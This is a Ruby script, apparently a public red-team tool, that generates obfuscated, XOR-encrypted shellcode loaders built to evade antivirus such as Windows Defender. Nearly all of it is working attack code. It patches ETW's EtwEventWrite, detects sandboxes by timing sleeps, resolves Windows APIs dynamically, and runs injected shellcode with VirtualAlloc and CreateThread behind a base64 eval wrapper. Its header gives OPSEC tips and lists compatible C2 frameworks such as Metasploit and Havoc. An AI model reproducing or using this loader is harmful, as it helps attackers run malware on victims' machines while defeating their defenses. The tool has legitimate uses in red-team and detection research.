# =================================================================================================================================================================
# 'Invoke-Ruby-ShellCodeLoader.rb' is a shellcode loader script generator that aims to bypass AV solutions such as Windows Defender.
# It generates an obfuscated and encrypted shellcode loader Ruby script that implements several antivirus bypass and defense evasion techniques.
# Author: https://github.com/Jean-Francois-C / GNU General Public License v3.0
# =================================================================================================================================================================
# Features: 
# > Shellcode injection into the memory of the current process (Ruby)
# > Shellcode encryption (XOR)
# > Script obfuscation (randomized function and variable names + nested payloads with reflective loading)
# > ETW bypass in user-mode (patching method / EtwEventWrite function)
# > Dynamic API resolution (via GetProcAddress + hash-based API resolution)
# > Basic sandbox detection and evasion (Terminates execution if a 'sleep acceleration' is detected)
# > Compatible with shellcodes of multiple C2 frameworks (e.g., Metasploit, Havoc)
# OPSEC advice: remove all existing comments in this script before generating your obfuscated shellcode loader.
# =================================================================================================================================================================
# Usage (example):
# + C:\path\Ruby-3.10.4> Ruby.exe .\Invoke-Ruby-ShellCodeLoader.rb ".\ruby-shellcode.bin" ".\obfuscated_shellcodeloader.rb"
# =================================================================================================================================================================

require 'fiddle'
require 'fiddle/import'
require 'securerandom'
require 'base64'

# Exit if no argument
if ARGV.length != 2
  puts "Usage: ruby Invoke-Ruby-ShellCodeLoader.rb <shellcode_file.bin> <output_obfuscated_shellcode_loader.rb>"
  exit(1)
end

shellcode_path = ARGV[0]
output_filename = ARGV[1]

# Load the shellcode to encrypt and insert into the obfuscated shellcode loader script
# === LOAD SHELLCODE STRING ===
begin
  shellcode_str = eval(File.read(shellcode_path))
rescue => e
  puts "[!] Failed to load shellcode string: #{e.message}"
  exit(1)
end

unless shellcode_str.is_a?(String)
  puts "[!] Shellcode must be a Ruby string (e.g., \"\\x90\\x90\\xCC\")"
  exit(1)
end

# === CONVERT TO BYTE ARRAY ===
shellcode_bytes = shellcode_str.bytes

# Encrypt the Shellcode
# xor_key = 0xAA
xor_key = SecureRandom.random_bytes(1).ord
encrypted = shellcode_bytes.map { |byte| byte ^ xor_key }

# Random name generator function
def random_name(prefix = "var")
  "#{prefix}_#{SecureRandom.hex(4)}"
end

# Randomized names
key_var_name = random_name("key")
enc_var_name = random_name("enc")
dec_var_name = random_name("dec")
mem_var_name = random_name("mem")
addr_var_name = random_name("addr")
ror_var_name = random_name("ror")
api_var_name = random_name("api")
e_var_name = random_name("e")
d_var_name = random_name("d")

# Generate the obfuscated shellcode loader script
stub = <<~RUBY

require 'fiddle'
require 'fiddle/import'
require 'securerandom'

# Basic sandbox detection check (Sleep timing)
# ============================================
start = Time.now
sleep(10)
elapsed = Time.now - start
if elapsed < 9
  puts "=> Sandbox detected: sleep acceleration"
  exit
end

# ETW Patching in Ruby (x64) for the current process 
# ===================================================
# Load ntdll.dll
ntdll = Fiddle.dlopen('ntdll.dll')

# Get address of EtwEventWrite
get_proc_address = Fiddle::Function.new(
  Fiddle.dlopen('kernel32.dll')['GetProcAddress'],
  [Fiddle::TYPE_VOIDP, Fiddle::TYPE_VOIDP],
  Fiddle::TYPE_VOIDP
)

#{addr_var_name} = get_proc_address.call(ntdll.to_i, Fiddle::Pointer["EtwEventWrite\0"])
raise "Failed to resolve EtwEventWrite" if #{addr_var_name}.to_i == 0

# Change memory protection to allow writing
virtual_protect = Fiddle::Function.new(
  Fiddle.dlopen('kernel32.dll')['VirtualProtect'],
  [Fiddle::TYPE_VOIDP, Fiddle::TYPE_SIZE_T, Fiddle::TYPE_UINT, Fiddle::TYPE_VOIDP],
  Fiddle::TYPE_INT
)

old_protect = Fiddle::Pointer.malloc(Fiddle::SIZEOF_INT)
virtual_protect.call(#{addr_var_name}, 1, 0x40, old_protect)  # PAGE_EXECUTE_READWRITE

# Patch EtwEventWrite with RET (0xC3)
Fiddle::Pointer.new(#{addr_var_name})[0] = 0xC3
# stub = [0x33, 0xC0, 0xC3].pack('C*') # xor eax, eax; ret
# Fiddle::Pointer.new(#{addr_var_name})[0, stub.size] = stub
# puts "=> ETW successfully patched."

# Encrypted shellcode
# ====================
 #{enc_var_name} = [
    #{encrypted.map { |b| "0x%02X" % b }.join(', ')}
  ]

# Decrypt the shellcode
# ======================
#{key_var_name} = 0x#{xor_key.to_s(16)}
#{dec_var_name} =  #{enc_var_name}.map { |b| b ^ #{key_var_name} }.pack('C*')


# Resolves Windows APIs via hashed name
# ======================================

# === ROR13 HASH FUNCTION ===
def #{ror_var_name}(str)
  hash = 0
  str.each_byte do |b|
    hash = ((hash >> 13) | (hash << (32 - 13))) & 0xFFFFFFFF
    hash = (hash + b) & 0xFFFFFFFF
  end
  hash
end

# === API HASHES === 
#{api_var_name} = {
  #{ror_var_name}("VirtualAlloc") => "VirtualAlloc",
  #{ror_var_name}("CreateThread") => "CreateThread",
  #{ror_var_name}("WaitForSingleObject") => "WaitForSingleObject"
}

# === API RESOLUTION ===
kernel32 = Fiddle.dlopen("kernel32.dll")
get_proc_address = Fiddle::Function.new(
  kernel32["GetProcAddress"],
  [Fiddle::TYPE_VOIDP, Fiddle::TYPE_VOIDP],
  Fiddle::TYPE_VOIDP
)

resolved = {}
#{api_var_name}.each do |hash, name|
  ptr = get_proc_address.call(kernel32.to_i, Fiddle::Pointer[name + "\0"])
  resolved[name] = Fiddle::Function.new(ptr, [], Fiddle::TYPE_VOIDP)
end


# Allocate memory 
# ================
virtual_alloc = Fiddle::Function.new(
  resolved["VirtualAlloc"].to_i,
  [Fiddle::TYPE_VOIDP, Fiddle::TYPE_SIZE_T, Fiddle::TYPE_UINT, Fiddle::TYPE_UINT],
  Fiddle::TYPE_VOIDP
)

#{mem_var_name} = virtual_alloc.call(nil, #{dec_var_name}.bytesize, 0x1000 | 0x2000, 0x40)
Fiddle::Pointer.new(#{mem_var_name})[0, #{dec_var_name}.bytesize] = #{dec_var_name}

# Execute the shellcode 
# ======================
create_thread = Fiddle::Function.new(
  resolved["CreateThread"].to_i,
  [Fiddle::TYPE_VOIDP, Fiddle::TYPE_SIZE_T, Fiddle::TYPE_VOIDP, Fiddle::TYPE_VOIDP, Fiddle::TYPE_UINT, Fiddle::TYPE_VOIDP],
  Fiddle::TYPE_VOIDP
)

wait_for_single_object = Fiddle::Function.new(
  resolved["WaitForSingleObject"].to_i,
  [Fiddle::TYPE_VOIDP, Fiddle::TYPE_UINT],
  Fiddle::TYPE_UINT
)

thread = create_thread.call(nil, 0, #{mem_var_name}, nil, 0, nil)
wait_for_single_object.call(thread, 0xFFFFFFFF)

RUBY

# script = File.read(output_filename)
# encoded = Base64.strict_encode64(script)
# puts encoded

encoded_stub = Base64.strict_encode64(stub)

# Generate the final version of the obfuscated shellcode loader script
stub2 = <<~RUBY
require 'base64'
#{e_var_name} = "#{encoded_stub}"
#{d_var_name} = Base64.decode64(#{e_var_name})
eval(#{d_var_name})
RUBY

# Create the final version of the obfuscated shellcode loader script file
begin
  File.write(output_filename, stub2)
  puts "[+] The obfuscated shellcode loader script has been written to #{output_filename}"
rescue => e
  puts "[!] Failed to write output file: #{e.message}"
end
